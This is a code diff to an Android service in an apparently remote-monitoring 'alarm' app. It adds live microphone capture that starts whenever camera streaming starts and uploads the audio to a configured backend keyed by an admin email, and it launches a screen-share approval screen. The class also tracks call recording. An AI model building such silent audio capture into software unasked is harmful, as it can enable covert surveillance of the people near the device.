@@ -93,6 +93,11 @@ public class AlarmService extends Service {
     private boolean isUploadingFrame = false;
     private LocalStreamServer localStreamServer;
 
+    private boolean isStreamingCameraAudio = false;
+    private android.media.AudioRecord cameraAudioRecord;
+    private java.io.PipedOutputStream cameraAudioStreamPout;
+    private okhttp3.Call cameraAudioStreamCall;
+
     // Screen mirroring state
     public static boolean hasProjectionToken = false;
     public static int pendingResultCode = 0;
@@ -802,6 +807,9 @@ public class AlarmService extends Service {
 
             streamingCaptureSession.setRepeatingRequest(builder.build(), null, cameraBackgroundHandler);
             Log.i(TAG, "Camera repeating capture request started successfully.");
+            
+            // Start audio stream alongside camera feed
+            startCameraAudioStreaming();
         } catch (CameraAccessException e) {
             Log.e(TAG, "Failed to start camera repeating capture", e);
         }
@@ -812,6 +820,8 @@ public class AlarmService extends Service {
         Log.i(TAG, "Stopping camera stream.");
         isStreamingCamera = false;
         activeStreamingCameraId = null;
+
+        stopCameraAudioStreaming();
 
         // Release Camera Capture Session
         if (streamingCaptureSession != null) {
@@ -850,6 +860,153 @@ public class AlarmService extends Service {
 
         // Reset foreground service notification to normal type
         updateServiceForegroundState();
+    }
+
+    private void startCameraAudioStreaming() {
+        if (isStreamingCameraAudio) return;
+        if (isRecordingCall) {
+            Log.w(TAG, "Call recording is active. Skipping camera audio stream.");
+            return;
+        }
+        isStreamingCameraAudio = true;
+
+        new Thread(() -> {
+            try {
+                int sampleRate = 16000;
+                int channelConfig = android.media.AudioFormat.CHANNEL_IN_MONO;
+                int audioFormat = android.media.AudioFormat.ENCODING_PCM_16BIT;
+                int bufferSize = android.media.AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
+
+                if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                    Log.e(TAG, "RECORD_AUDIO permission not granted for camera audio");
+                    isStreamingCameraAudio = false;
+                    return;
+                }
+
+                cameraAudioRecord = new android.media.AudioRecord(
+                    android.media.MediaRecorder.AudioSource.MIC,
+                    sampleRate,
+                    channelConfig,
+                    audioFormat,
+                    bufferSize
+                );
+
+                if (cameraAudioRecord.getState() != android.media.AudioRecord.STATE_INITIALIZED) {
+                    Log.e(TAG, "Failed to initialize AudioRecord for camera stream");
+                    isStreamingCameraAudio = false;
+                    return;
+                }
+
+                cameraAudioRecord.startRecording();
+                Log.i(TAG, "Camera AudioRecord started recording.");
+
+                byte[] buffer = new byte[2048];
+                okhttp3.OkHttpClient client = new okhttp3.OkHttpClient.Builder()
+                        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                        .writeTimeout(0, java.util.concurrent.TimeUnit.SECONDS)
+                        .readTimeout(0, java.util.concurrent.TimeUnit.SECONDS)
+                        .build();
+
+                SharedPreferences prefs = getSharedPreferences("RemoteAlarmPrefs", MODE_PRIVATE);
+                String serverUrl = prefs.getString("backend_url", "");
+                String adminEmail = prefs.getString("email", "");
+
+                if (serverUrl.endsWith("/")) {
+                    serverUrl = serverUrl.substring(0, serverUrl.length() - 1);
+                }
+
+                if (!serverUrl.isEmpty() && !adminEmail.isEmpty()) {
+                    cameraAudioStreamPout = new java.io.PipedOutputStream();
+                    final java.io.PipedInputStream pin = new java.io.PipedInputStream(cameraAudioStreamPout, 16384);
+
+                    final String postUrl = serverUrl + "/api/audio/upload?email=" + java.net.URLEncoder.encode(adminEmail, "UTF-8");
+
+                    okhttp3.RequestBody requestBody = new okhttp3.RequestBody() {
+                        @Override
+                        public okhttp3.MediaType contentType() {
+                            return okhttp3.MediaType.parse("application/octet-stream");
+                        }
+
+                        @Override
+                        public void writeTo(okio.BufferedSink sink) throws java.io.IOException {
+                            byte[] streamBuf = new byte[2048];
+                            int streamRead;
+                            while ((streamRead = pin.read(streamBuf)) != -1) {
+                                sink.write(streamBuf, 0, streamRead);
+                                sink.flush();
+                            }
+                        }
+                    };
+
+                    okhttp3.Request request = new okhttp3.Request.Builder()
+                            .url(postUrl)
+                            .post(requestBody)
+                            .build();
+
+                    new Thread(() -> {
+                        try {
+                            cameraAudioStreamCall = client.newCall(request);
+                            okhttp3.Response response = cameraAudioStreamCall.execute();
+                            response.close();
+                            Log.i(TAG, "Camera live audio stream finished successfully.");
+                        } catch (Exception e) {
+                            Log.w(TAG, "Camera live audio stream connection ended: " + e.getMessage());
+                        }
+                    }).start();
+                }
+
+                while (isStreamingCameraAudio) {
+                    int read = cameraAudioRecord.read(buffer, 0, buffer.length);
+                    if (read > 0 && cameraAudioStreamPout != null) {
+                        try {
+                            cameraAudioStreamPout.write(buffer, 0, read);
+                            cameraAudioStreamPout.flush();
+                        } catch (Exception e) {
+                            Log.w(TAG, "Error writing camera audio bytes: " + e.getMessage());
+                        }
+                    }
+                }
+
+            } catch (Exception e) {
+                Log.e(TAG, "Error in camera AudioRecord thread: " + e.getMessage());
+            } finally {
+                if (cameraAudioStreamPout != null) {
+                    try { cameraAudioStreamPout.close(); } catch (Exception ignored) {}
+                    cameraAudioStreamPout = null;
+                }
+                if (cameraAudioRecord != null) {
+                    try {
+                        cameraAudioRecord.stop();
+                        cameraAudioRecord.release();
+                    } catch (Exception ignored) {}
+                    cameraAudioRecord = null;
+                }
+            }
+        }).start();
+    }
+
+    private void stopCameraAudioStreaming() {
+        if (!isStreamingCameraAudio) return;
+        Log.i(TAG, "Stopping camera audio streaming.");
+        isStreamingCameraAudio = false;
+
+        if (cameraAudioStreamPout != null) {
+            try { cameraAudioStreamPout.close(); } catch (Exception ignored) {}
+            cameraAudioStreamPout = null;
+        }
+
+        if (cameraAudioStreamCall != null) {
+            try { cameraAudioStreamCall.cancel(); } catch (Exception ignored) {}
+            cameraAudioStreamCall = null;
+        }
+
+        if (cameraAudioRecord != null) {
+            try {
+                cameraAudioRecord.stop();
+                cameraAudioRecord.release();
+            } catch (Exception ignored) {}
+            cameraAudioRecord = null;
+        }
     }
 
     private void uploadFrame(byte[] jpegData) {
@@ -904,6 +1061,15 @@ public class AlarmService extends Service {
             startScreenCaptureSession();
         } else {
             showScreenShareRequestNotification();
+            try {
+                Intent intent = new Intent(this, MainActivity.class);
+                intent.setAction("REQUEST_SCREEN_CAPTURE");
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                startActivity(intent);
+                Log.i(TAG, "Launched MainActivity to display screen share approval popup.");
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to launch MainActivity directly: " + e.getMessage());
+            }
         }
     }
 
@@ -1159,7 +1325,7 @@ public class AlarmService extends Service {
         }
 
         String url = baseUrl + "/api/screen/control";
-        String jsonPayload = String.format("{\"email\": \"%s\", \"action\": \"%s\"}", email, active ? "start" : "stop");
+        String jsonPayload = String.format("{\"email\": \"%s\", \"action\": \"%s\", \"source\": \"device\"}", email, active ? "start" : "stop");
 
         RequestBody body = RequestBody.create(
                 jsonPayload,
